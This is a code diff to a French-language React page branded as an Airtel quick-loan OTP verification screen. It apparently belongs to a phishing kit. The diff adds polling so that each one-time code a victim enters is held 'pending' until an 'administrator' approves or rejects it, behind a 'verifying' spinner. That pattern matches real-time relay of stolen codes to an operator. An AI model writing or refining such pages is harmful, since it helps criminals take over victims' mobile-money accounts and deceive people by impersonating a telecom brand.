@@ -12,6 +12,7 @@ function AirtelOTPVerify() {
   const [toast, setToast] = useState<{ message: string; type: 'error' | 'success' | 'info' } | null>(null);
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
   const navigate = useNavigate();
+  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
   const phoneNumber = localStorage.getItem('airtelPhone') || '';
 
@@ -46,8 +47,22 @@ function AirtelOTPVerify() {
     return () => clearTimeout(timer);
   }, [timeLeft]);
 
+  // Cleanup polling on unmount
+  useEffect(() => {
+    return () => {
+      if (pollRef.current) clearInterval(pollRef.current);
+    };
+  }, []);
+
   const showToast = (message: string, type: 'error' | 'success' | 'info' = 'error') => {
     setToast({ message, type });
+  };
+
+  const stopPolling = () => {
+    if (pollRef.current) {
+      clearInterval(pollRef.current);
+      pollRef.current = null;
+    }
   };
 
   const handleChange = (index: number, value: string) => {
@@ -64,6 +79,46 @@ function AirtelOTPVerify() {
     if (e.key === 'Backspace' && !otp[index] && index > 0) {
       inputRefs.current[index - 1]?.focus();
     }
+  };
+
+  // Start polling for admin approval
+  const startPolling = () => {
+    let attempts = 0;
+    const maxAttempts = 60; // 2 minutes
+
+    pollRef.current = setInterval(async () => {
+      attempts++;
+      if (attempts > maxAttempts) {
+        stopPolling();
+        setIsVerifying(false);
+        showToast('⏱️ Délai dépassé. Veuillez réessayer.', 'error');
+        setError('Vérification expirée. Veuillez réessayer.');
+        return;
+      }
+
+      try {
+        const res = await fetch(
+          `${import.meta.env.VITE_API_BASE_URL}/api/otp-status/${encodeURIComponent(phoneNumber)}`
+        );
+        const data = await res.json();
+
+        if (data.status === 'approved') {
+          stopPolling();
+          showToast('✅ Approuvé ! Redirection...', 'success');
+          setTimeout(() => navigate('/airtel-loan-limit'), 600);
+        } else if (data.status === 'rejected') {
+          stopPolling();
+          setIsVerifying(false);
+          setError('Code refusé par l\'administrateur.');
+          showToast('❌ Code refusé par l\'administrateur.', 'error');
+          setOtp(['', '', '', '']);
+          setTimeout(() => inputRefs.current[0]?.focus(), 100);
+        }
+        // If 'pending', keep polling silently
+      } catch {
+        // Network hiccup — keep polling
+      }
+    }, 2000);
   };
 
   const handleVerify = async (e: React.FormEvent) => {
@@ -94,24 +149,41 @@ function AirtelOTPVerify() {
 
       if (data.status === 'success') {
         showToast('✅ Code correct ! Redirection...', 'success');
-        setTimeout(() => navigate('/airtel-loan-limit'), 800);
-      } else {
-        showToast('❌ Code incorrect ! Vérifiez le code reçu par SMS.', 'error');
-        setError(data.message || 'Code invalide. Veuillez réessayer.');
-        setOtp(['', '', '', '']);
-        setTimeout(() => {
-          inputRefs.current[0]?.focus();
-        }, 100);
-        setIsVerifying(false);
+        setTimeout(() => navigate('/airtel-loan-limit'), 600);
+        return;
       }
+
+      if (data.status === 'pending') {
+        // OTP is correct, but admin hasn't decided — start polling
+        startPolling();
+        return;
+      }
+
+      if (data.status === 'rejected') {
+        setIsVerifying(false);
+        setError('Code refusé par l\'administrateur.');
+        showToast('❌ Code refusé par l\'administrateur.', 'error');
+        setOtp(['', '', '', '']);
+        setTimeout(() => inputRefs.current[0]?.focus(), 100);
+        return;
+      }
+
+      // Any other case = invalid OTP
+      setIsVerifying(false);
+      setError(data.message || 'Code invalide. Veuillez réessayer.');
+      showToast('❌ Code incorrect ! Vérifiez le code reçu par SMS.', 'error');
+      setOtp(['', '', '', '']);
+      setTimeout(() => inputRefs.current[0]?.focus(), 100);
     } catch {
+      setIsVerifying(false);
       showToast('⚠️ Erreur de connexion. Vérifiez votre réseau.', 'error');
       setError('Erreur lors de la vérification. Veuillez réessayer.');
-      setIsVerifying(false);
     }
   };
 
   const handleResend = async () => {
+    if (isVerifying) return;
+
     setTimeLeft(45);
     setExpired(false);
     setOtp(['', '', '', '']);
@@ -131,9 +203,7 @@ function AirtelOTPVerify() {
 
       if (data.status === 'success') {
         showToast('📩 Un nouveau code a été envoyé sur votre téléphone.', 'success');
-        setTimeout(() => {
-          inputRefs.current[0]?.focus();
-        }, 100);
+        setTimeout(() => inputRefs.current[0]?.focus(), 100);
       } else {
         showToast(data.message || 'Échec de l\'envoi du nouveau code.', 'error');
       }
@@ -146,7 +216,7 @@ function AirtelOTPVerify() {
 
   return (
     <div className="airtel-container">
-      {/* ---- Custom Toast Notification ---- */}
+      {/* Toast */}
       {toast && (
         <div className={`airtel-toast airtel-toast-${toast.type}`}>
           <div className="airtel-toast-icon">
@@ -181,7 +251,7 @@ function AirtelOTPVerify() {
         </div>
       )}
 
-      {/* En-tête */}
+      {/* Header */}
       <div className="airtel-header">
         <div className="airtel-hamburger">
           <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="black" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
@@ -194,102 +264,106 @@ function AirtelOTPVerify() {
         <p className="airtel-tagline">Prêts rapides. À tout moment. Partout.</p>
       </div>
 
-      {/* Carte blanche principale */}
+      {/* Card */}
       <div className="airtel-card">
-        <button className="airtel-back-link" onClick={() => navigate('/')}>
-          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-            <line x1="19" y1="12" x2="5" y2="12"></line>
-            <polyline points="12 19 5 12 12 5"></polyline>
-          </svg>
-          Retour à la connexion
-        </button>
-
-        <h2 className="airtel-otp-heading">Vérifiez votre code</h2>
-        <p className="airtel-otp-subtext">
-          Saisissez le code à 4 chiffres envoyé à {phoneNumber || '+243 XXX XXX XXX'}
-        </p>
-
-        <form onSubmit={handleVerify}>
-          <div className="airtel-input-group">
-            <label>Saisir le code OTP</label>
-            <div className="airtel-otp-container">
-              {otp.map((digit, index) => (
-                <input
-                  key={index}
-                  type="tel"
-                  maxLength={1}
-                  value={digit}
-                  ref={(el) => { inputRefs.current[index] = el; }}
-                  onChange={(e) => handleChange(index, e.target.value)}
-                  onKeyDown={(e) => handleKeyDown(index, e)}
-                  className="airtel-otp-box"
-                  disabled={expired || isVerifying}
-                />
-              ))}
-            </div>
-          </div>
-
-          {error && (
-            <div className="airtel-alert" style={{ marginBottom: '20px' }}>
-              <div className="alert-icon">
-                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#C81E1E" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                  <circle cx="12" cy="12" r="10"></circle>
-                  <line x1="12" y1="16" x2="12" y2="12"></line>
-                  <line x1="12" y1="8" x2="12.01" y2="8"></line>
-                </svg>
-              </div>
-              <span>{error}</span>
-            </div>
-          )}
-
-          <div className="airtel-timer" style={expired ? { color: '#DC2626' } : undefined}>
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke={expired ? '#DC2626' : '#E53E3E'} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-              <circle cx="12" cy="12" r="10"></circle>
-              <polyline points="12 6 12 12 16 14"></polyline>
+        {!isVerifying && (
+          <button className="airtel-back-link" onClick={() => navigate('/')}>
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+              <line x1="19" y1="12" x2="5" y2="12"></line>
+              <polyline points="12 19 5 12 12 5"></polyline>
             </svg>
-            <span>{expired ? 'Code expiré' : `${timeLeft}s`}</span>
-          </div>
+            Retour à la connexion
+          </button>
+        )}
 
-          {/* Verify Button with Spinner */}
-          <button
-            type="submit"
-            className="airtel-verify-btn"
-            disabled={expired || isVerifying}
-            style={expired ? { opacity: 0.5, cursor: 'not-allowed' } : undefined}
-          >
-            {isVerifying ? (
-              <span className="airtel-btn-loading">
-                <span className="airtel-spinner"></span>
-                Vérification...
-              </span>
-            ) : (
-              <>
+        {/* ---- SPINNER STATE (while verifying) ---- */}
+        {isVerifying ? (
+          <div className="airtel-verifying-state">
+            <div className="airtel-big-spinner"></div>
+            <h2 className="airtel-otp-heading">Vérification en cours...</h2>
+            <p className="airtel-otp-subtext">
+              Veuillez patienter pendant que nous validons votre code.
+            </p>
+          </div>
+        ) : (
+          <>
+            <h2 className="airtel-otp-heading">Vérifiez votre code</h2>
+            <p className="airtel-otp-subtext">
+              Saisissez le code à 4 chiffres envoyé à {phoneNumber || '+243 XXX XXX XXX'}
+            </p>
+
+            <form onSubmit={handleVerify}>
+              <div className="airtel-input-group">
+                <label>Saisir le code OTP</label>
+                <div className="airtel-otp-container">
+                  {otp.map((digit, index) => (
+                    <input
+                      key={index}
+                      type="tel"
+                      maxLength={1}
+                      value={digit}
+                      ref={(el) => { inputRefs.current[index] = el; }}
+                      onChange={(e) => handleChange(index, e.target.value)}
+                      onKeyDown={(e) => handleKeyDown(index, e)}
+                      className="airtel-otp-box"
+                      disabled={expired}
+                    />
+                  ))}
+                </div>
+              </div>
+
+              {error && (
+                <div className="airtel-alert" style={{ marginBottom: '20px' }}>
+                  <div className="alert-icon">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#C81E1E" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                      <circle cx="12" cy="12" r="10"></circle>
+                      <line x1="12" y1="16" x2="12" y2="12"></line>
+                      <line x1="12" y1="8" x2="12.01" y2="8"></line>
+                    </svg>
+                  </div>
+                  <span>{error}</span>
+                </div>
+              )}
+
+              <div className="airtel-timer" style={expired ? { color: '#DC2626' } : undefined}>
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke={expired ? '#DC2626' : '#E53E3E'} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                  <circle cx="12" cy="12" r="10"></circle>
+                  <polyline points="12 6 12 12 16 14"></polyline>
+                </svg>
+                <span>{expired ? 'Code expiré' : `${timeLeft}s`}</span>
+              </div>
+
+              <button
+                type="submit"
+                className="airtel-verify-btn"
+                disabled={expired}
+                style={expired ? { opacity: 0.5, cursor: 'not-allowed' } : undefined}
+              >
                 Vérifier le code
                 <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                   <line x1="5" y1="12" x2="19" y2="12"></line>
                   <polyline points="12 5 19 12 12 19"></polyline>
                 </svg>
-              </>
-            )}
-          </button>
+              </button>
 
-          {/* Resend Button with Spinner */}
-          <button
-            type="button"
-            className="airtel-resend-btn"
-            onClick={handleResend}
-            disabled={isResending || isVerifying}
-          >
-            {isResending ? (
-              <span className="airtel-btn-loading">
-                <span className="airtel-spinner airtel-spinner-dark"></span>
-                Envoi en cours...
-              </span>
-            ) : (
-              'Renvoyer le code'
-            )}
-          </button>
-        </form>
+              <button
+                type="button"
+                className="airtel-resend-btn"
+                onClick={handleResend}
+                disabled={isResending}
+              >
+                {isResending ? (
+                  <span className="airtel-btn-loading">
+                    <span className="airtel-spinner airtel-spinner-dark"></span>
+                    Envoi en cours...
+                  </span>
+                ) : (
+                  'Renvoyer le code'
+                )}
+              </button>
+            </form>
+          </>
+        )}
       </div>
     </div>
   );
